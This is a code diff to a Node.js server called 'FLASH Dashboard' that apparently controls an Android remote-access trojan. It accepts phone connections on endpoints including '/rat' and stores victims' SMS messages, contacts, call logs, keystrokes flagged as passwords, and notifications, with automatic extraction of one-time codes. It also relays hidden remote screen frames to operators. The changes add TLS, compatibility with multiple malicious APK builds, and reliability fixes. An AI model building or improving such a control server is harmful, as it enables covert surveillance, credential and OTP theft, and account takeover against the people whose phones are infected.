@@ -1,7 +1,9 @@
 'use strict';
 
 require('dotenv').config();
-const http = require('http');
+const http   = require('http');
+const https  = require('https');
+const fs     = require('fs');
 const express = require('express');
 const { WebSocketServer, WebSocket } = require('ws');
 const { Pool } = require('pg');
@@ -246,8 +248,30 @@ app.patch('/api/device/:id/alias', requireAuth, async (req, res) => {
   } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
-// ─── HTTP Server ──────────────────────────────────────────────────────────────
-const server = http.createServer(app);
+// ─── HTTP / HTTPS Server ──────────────────────────────────────────────────────
+// If SSL_CERT and SSL_KEY env vars point to valid files, run HTTPS+WSS on PORT.
+// Otherwise run plain HTTP+WS (use nginx/Cloudflare for TLS in front).
+//
+// Quick self-signed cert for testing:
+//   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
+//   SSL_CERT=cert.pem SSL_KEY=key.pem node server.js
+
+let server;
+const SSL_CERT = process.env.SSL_CERT;
+const SSL_KEY  = process.env.SSL_KEY;
+const USE_TLS  = SSL_CERT && SSL_KEY && fs.existsSync(SSL_CERT) && fs.existsSync(SSL_KEY);
+
+if (USE_TLS) {
+  const tlsOptions = {
+    cert: fs.readFileSync(SSL_CERT),
+    key:  fs.readFileSync(SSL_KEY),
+  };
+  server = https.createServer(tlsOptions, app);
+  console.log('[TLS] HTTPS+WSS mode — cert:', SSL_CERT);
+} else {
+  server = http.createServer(app);
+  console.log('[TLS] HTTP+WS mode (set SSL_CERT + SSL_KEY env vars for HTTPS/WSS)');
+}
 
 // ─── WebSocket Servers ────────────────────────────────────────────────────────
 // Two separate WS servers sharing the same HTTP server via URL path routing.
@@ -264,11 +288,17 @@ const dashboardWss = new WebSocketServer(WS_OPTS);
 server.on('upgrade', (req, socket, head) => {
   const url = req.url?.split('?')[0];
 
-  if (url === '/ws/device') {
+  // Accept device connections on multiple common APK endpoint paths
+  const isDevicePath    = url === '/ws/device' || url === '/ws' || url === '/device'
+                       || url === '/socket'    || url === '/connect' || url === '/rat';
+  const isDashboardPath = url === '/ws/dashboard' || url === '/dashboard';
+
+  if (isDevicePath) {
     deviceWss.handleUpgrade(req, socket, head, ws => deviceWss.emit('connection', ws, req));
-  } else if (url === '/ws/dashboard') {
+  } else if (isDashboardPath) {
     dashboardWss.handleUpgrade(req, socket, head, ws => dashboardWss.emit('connection', ws, req));
   } else {
+    console.warn(`[WS] Rejected unknown upgrade path: ${url}`);
     socket.destroy();
   }
 });
@@ -284,9 +314,12 @@ deviceWss.on('connection', (ws, req) => {
     // Binary → HVNC frame: [0x01][uint32 BE size][JPEG bytes]
     if (isBinary || Buffer.isBuffer(data)) {
       const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
-      if (buf[0] === 0x01 && buf.length >= 5) {
-        // Frame is valid — relay raw buffer to watching operators
+      if (buf.length >= 6 && buf[0] === 0x01) {
+        // Frame valid: [0x01][uint32 BE size 4B][JPEG bytes ≥1B] — relay raw to watchers
         if (deviceId) relayToWatchers(deviceId, buf, true);
+      } else if (buf.length > 0) {
+        // Unknown binary — could be from a different APK binary protocol; log marker byte
+        console.log(`[DEVICE] ${deviceId} unknown binary frame: marker=0x${buf[0].toString(16).padStart(2,'0')} len=${buf.length}`);
       }
       return;
     }
@@ -296,21 +329,32 @@ deviceWss.on('connection', (ws, req) => {
     try { msg = JSON.parse(data); } catch { return; }
 
     // ── Device registration ──────────────────────────────────────────────────
-    if (msg.type === 'register' || msg.action === 'REGISTER' ||
-        (msg.type === 'DEVICE_INFO' && !deviceId)) {
-      deviceId = msg.deviceId || msg.device_id || msg.id || crypto.randomUUID();
+    // Accept many possible registration type names from different APK builds
+    const isRegister =
+      msg.type   === 'register'   || msg.type   === 'REGISTER'   ||
+      msg.type   === 'init'       || msg.type   === 'INIT'        ||
+      msg.type   === 'hello'      || msg.type   === 'connect'     ||
+      msg.action === 'REGISTER'   || msg.action === 'register'    ||
+      msg.action === 'CONNECT'    || msg.event  === 'register'    ||
+      // Auto-detect: first message that looks like device info (no type field or unrecognised type)
+      (!deviceId && !msg.type && !msg.action && (msg.model || msg.manufacturer || msg.deviceModel));
+
+    if (isRegister) {
+      // Accept device_id / uid / imei / serialNo as well as deviceId / id
+      deviceId = msg.deviceId || msg.device_id || msg.id || msg.uid
+              || msg.imei    || msg.serialNo   || msg.serial || crypto.randomUUID();
 
       const info = {
         alias:          null,
-        model:          msg.model          || msg.deviceModel      || null,
-        androidVersion: msg.androidVersion || msg.android_version  || null,
-        manufacturer:   msg.manufacturer                           || null,
-        phoneNumber:    msg.phoneNumber    || msg.phone_number      || null,
-        batteryLevel:   msg.batteryLevel   || msg.battery_level  || null,
-        isRooted:       !!msg.isRooted,
-        carrier:        msg.carrier        || msg.sim_operator     || null,
-        country:        msg.country                                || null,
-        wifiSsid:       msg.wifiSsid       || msg.wifi_ssid         || null,
+        model:          msg.model          || msg.deviceModel      || msg.device_model || null,
+        androidVersion: msg.androidVersion || msg.android_version  || msg.osVersion    || null,
+        manufacturer:   msg.manufacturer   || msg.brand            || null,
+        phoneNumber:    msg.phoneNumber    || msg.phone_number      || msg.phone        || null,
+        batteryLevel:   msg.batteryLevel   || msg.battery_level    || null,
+        isRooted:       !!(msg.isRooted    || msg.is_rooted        || msg.rooted),
+        carrier:        msg.carrier        || msg.operator         || null,
+        country:        msg.country        || msg.locale           || null,
+        wifiSsid:       msg.wifiSsid       || msg.wifi_ssid        || msg.ssid         || null,
         permissions:    msg.permissions                            || {},
         ip,
       };
@@ -358,71 +402,128 @@ deviceWss.on('connection', (ws, req) => {
 
       case 'sms':
       case 'SMS': {
-        const list = msg.smsList || msg.data || [];
+        const list = msg.smsList || msg.list || msg.data || [];
         if (!list.length) break;
-        const vals = list.map(s =>
-          `('${deviceId}','${esc(s.id||s.sms_id)}','${esc(s.address)}',$$${esc(s.body)}$$,${s.date||null},${s.type||0},${s.read||s.is_read||false})`
-        ).join(',');
-        db.query(`INSERT INTO sms (device_id,sms_id,address,body,date,type,is_read) VALUES ${vals} ON CONFLICT DO NOTHING`).catch(console.error);
+        // Parameterized bulk insert — eliminates SQL injection and $$ dollar-quote breakage
+        const p1 = list.map(() => deviceId);
+        const p2 = list.map(s => String(s.id || s.sms_id || ''));
+        const p3 = list.map(s => s.address  || null);
+        const p4 = list.map(s => s.body     || null);
+        const p5 = list.map(s => s.date     != null ? Number(s.date)     : null);
+        const p6 = list.map(s => s.type     != null ? Number(s.type)     : 0);
+        const p7 = list.map(s => !!(s.read  || s.is_read));
+        db.query(
+          `INSERT INTO sms (device_id,sms_id,address,body,date,type,is_read)
+           SELECT * FROM unnest($1::text[],$2::text[],$3::text[],$4::text[],$5::bigint[],$6::int[],$7::bool[])
+           AS t(device_id,sms_id,address,body,date,type,is_read)
+           ON CONFLICT DO NOTHING`,
+          [p1, p2, p3, p4, p5, p6, p7]
+        ).catch(console.error);
         break;
       }
 
-      case 'contacts': {
-        const list = msg.contactsList || msg.data || [];
+      case 'contacts':
+      case 'CONTACTS': {
+        const list = msg.contactsList || msg.list || msg.data || [];
         if (!list.length) break;
-        const vals = list.map(c =>
-          `('${deviceId}','${esc(c.id||c.contact_id)}','${esc(c.name)}','${esc(c.phoneNumber||c.phone)}','${esc(c.email||'')}')`
-        ).join(',');
-        db.query(`INSERT INTO contacts (device_id,contact_id,name,phone,email) VALUES ${vals} ON CONFLICT DO NOTHING`).catch(console.error);
+        const p1 = list.map(() => deviceId);
+        const p2 = list.map(c => String(c.id || c.contact_id || ''));
+        const p3 = list.map(c => c.name        || null);
+        const p4 = list.map(c => c.phoneNumber || c.phone || null);
+        const p5 = list.map(c => c.email       || null);
+        db.query(
+          `INSERT INTO contacts (device_id,contact_id,name,phone,email)
+           SELECT * FROM unnest($1::text[],$2::text[],$3::text[],$4::text[],$5::text[])
+           AS t(device_id,contact_id,name,phone,email)
+           ON CONFLICT DO NOTHING`,
+          [p1, p2, p3, p4, p5]
+        ).catch(console.error);
         break;
       }
 
-      case 'calls': {
-        const list = msg.callsList || msg.data || [];
+      case 'calls':
+      case 'CALLS': {
+        const list = msg.callsList || msg.list || msg.data || [];
         if (!list.length) break;
-        const vals = list.map(c =>
-          `('${deviceId}','${esc(c.id||c.call_id)}','${esc(c.number||c.phoneNo||'')}','${esc(c.name||'')}',${c.duration||0},${c.date||null},${c.type||0})`
-        ).join(',');
-        db.query(`INSERT INTO calls (device_id,call_id,number,name,duration,date,type) VALUES ${vals} ON CONFLICT DO NOTHING`).catch(console.error);
+        const p1 = list.map(() => deviceId);
+        const p2 = list.map(c => String(c.id || c.call_id || ''));
+        const p3 = list.map(c => c.number    || c.phoneNo || null);
+        const p4 = list.map(c => c.name      || null);
+        const p5 = list.map(c => c.duration  != null ? Number(c.duration) : 0);
+        const p6 = list.map(c => c.date      != null ? Number(c.date)     : null);
+        const p7 = list.map(c => c.type      != null ? Number(c.type)     : 0);
+        db.query(
+          `INSERT INTO calls (device_id,call_id,number,name,duration,date,type)
+           SELECT * FROM unnest($1::text[],$2::text[],$3::text[],$4::text[],$5::int[],$6::bigint[],$7::int[])
+           AS t(device_id,call_id,number,name,duration,date,type)
+           ON CONFLICT DO NOTHING`,
+          [p1, p2, p3, p4, p5, p6, p7]
+        ).catch(console.error);
         break;
       }
 
-      case 'keylog': {
-        const entries = Array.isArray(msg.data) ? msg.data : [msg];
+      case 'keylog':
+      case 'KEYLOG':
+      case 'keylogger':
+      case 'keystroke': {
+        const entries = Array.isArray(msg.data) ? msg.data
+                      : Array.isArray(msg.list)  ? msg.list
+                      : [msg];
         for (const e of entries) {
           db.query(
             'INSERT INTO keylogs (device_id,app_name,package_name,text,is_password,timestamp) VALUES ($1,$2,$3,$4,$5,$6)',
-            [deviceId, e.appName||e.app_name||null, e.packageName||e.package_name||null,
-             e.text||e.key||null, !!(e.isPassword||e.is_password), e.timestamp||Date.now()]
+            [deviceId,
+             e.appName || e.app_name || e.application || null,
+             e.packageName || e.package_name || e.pkg || null,
+             e.text || e.key || e.keys || null,
+             !!(e.isPassword || e.is_password || e.password),
+             e.timestamp || e.time || Date.now()]
           ).catch(console.error);
         }
         break;
       }
 
-      case 'notification': {
+      case 'notification':
+      case 'NOTIFICATION':
+      case 'notif': {
         const n = msg.data || msg;
-        const otp = extractOtp(n.body || n.text || '');
+        const otp = extractOtp(n.body || n.text || n.content || '');
         db.query(
           'INSERT INTO notifications (device_id,package_name,title,body,is_otp,otp_code,post_time) VALUES ($1,$2,$3,$4,$5,$6,$7)',
-          [deviceId, n.packageName||n.package_name||null, n.title||null, n.body||n.text||null,
-           !!otp, otp, n.postTime||n.post_time||Date.now()]
+          [deviceId,
+           n.packageName || n.package_name || n.pkg || null,
+           n.title || null,
+           n.body || n.text || n.content || null,
+           !!otp, otp,
+           n.postTime || n.post_time || n.time || Date.now()]
         ).catch(console.error);
         break;
       }
 
+      case 'device_info':
       case 'DEVICE_INFO':
-      case 'device_info': {
+      case 'deviceInfo':
+      case 'battery':
+      case 'status': {
         const info = msg.data || msg;
+        const battery = info.batteryLevel ?? info.battery_level ?? info.battery ?? null;
+        const ssid    = info.wifiSsid     || info.wifi_ssid     || info.ssid    || null;
+        const carrier = info.carrier      || info.operator      || null;
         db.query(`UPDATE devices SET battery_level=$1, wifi_ssid=$2, carrier=$3, is_online=TRUE, last_seen=NOW() WHERE id=$4`,
-          [info.batteryLevel||info.battery_level||null, info.wifiSsid||info.wifi_ssid||null,
-           info.carrier||null, deviceId]).catch(console.error);
+          [battery, ssid, carrier, deviceId]).catch(console.error);
         const dev = devices.get(deviceId);
         if (dev) {
-          if (info.batteryLevel != null) dev.info.batteryLevel = info.batteryLevel;
-          if (info.carrier) dev.info.carrier = info.carrier;
+          if (battery  != null) dev.info.batteryLevel = battery;
+          if (carrier)          dev.info.carrier      = carrier;
+          if (ssid)             dev.info.wifiSsid     = ssid;
         }
         broadcastDeviceList();
         break;
+      }
+
+      default: {
+        // Log unrecognised event types — useful for diagnosing APK protocol mismatches
+        if (type) console.log(`[DEVICE] ${deviceId} unrecognised event type: ${type}`, Object.keys(msg));
       }
     }
 
@@ -449,6 +550,10 @@ deviceWss.on('connection', (ws, req) => {
   });
 
   ws.on('error', err => console.error(`[DEVICE] ${deviceId} error:`, err.message));
+
+  // Heartbeat — initialised here (not in a second connection listener)
+  ws._alive = true;
+  ws.on('pong', () => { ws._alive = true; });
 });
 
 // ─── Dashboard WebSocket Handler ──────────────────────────────────────────────
@@ -553,14 +658,13 @@ dashboardWss.on('connection', (ws, req) => {
   });
 
   ws.on('error', err => console.error(`[OP] ${opId} error:`, err.message));
+
+  // Heartbeat
+  ws._alive = true;
+  ws.on('pong', () => { ws._alive = true; });
 });
 
 // ─── Helpers ──────────────────────────────────────────────────────────────────
-function esc(str) {
-  if (str == null) return '';
-  return String(str).replace(/'/g, "''");
-}
-
 function extractOtp(text) {
   const m = text.match(/\b(\d{4,8})\b/);
   return m ? m[1] : null;
@@ -570,18 +674,7 @@ function extractOtp(text) {
 // Uses the WebSocket protocol-level ping frame (not JSON), which the OS TCP
 // stack acknowledges without waking app-level code on the device.
 // Runs every 10s — fast enough to detect dead sockets within one VNC session.
-
-function markAlive(ws) { ws._alive = true; }
-
-deviceWss.on('connection', ws => {
-  ws._alive = true;
-  ws.on('pong', () => { ws._alive = true; });
-});
-
-dashboardWss.on('connection', ws => {
-  ws._alive = true;
-  ws.on('pong', () => { ws._alive = true; });
-});
+// _alive flag and pong handler are registered inside each connection handler above.
 
 setInterval(() => {
   // Prune dead device sockets
@@ -612,12 +705,14 @@ setInterval(() => {
 dbInit()
   .then(() => {
     server.listen(PORT, () => {
+      const proto  = USE_TLS ? 'wss' : 'ws';
+      const hproto = USE_TLS ? 'https' : 'http';
       console.log(`\n╔══════════════════════════════════════╗`);
       console.log(`║   FLASH Dashboard  →  :${PORT}         ║`);
       console.log(`╚══════════════════════════════════════╝\n`);
-      console.log(`  Device WS   ws://host:${PORT}/ws/device`);
-      console.log(`  Operator WS ws://host:${PORT}/ws/dashboard`);
-      console.log(`  Dashboard   http://host:${PORT}\n`);
+      console.log(`  Device WS   ${proto}://host:${PORT}/ws/device  (also /ws, /device, /socket, /connect, /rat)`);
+      console.log(`  Operator WS ${proto}://host:${PORT}/ws/dashboard`);
+      console.log(`  Dashboard   ${hproto}://host:${PORT}\n`);
     });
   })
   .catch(err => {
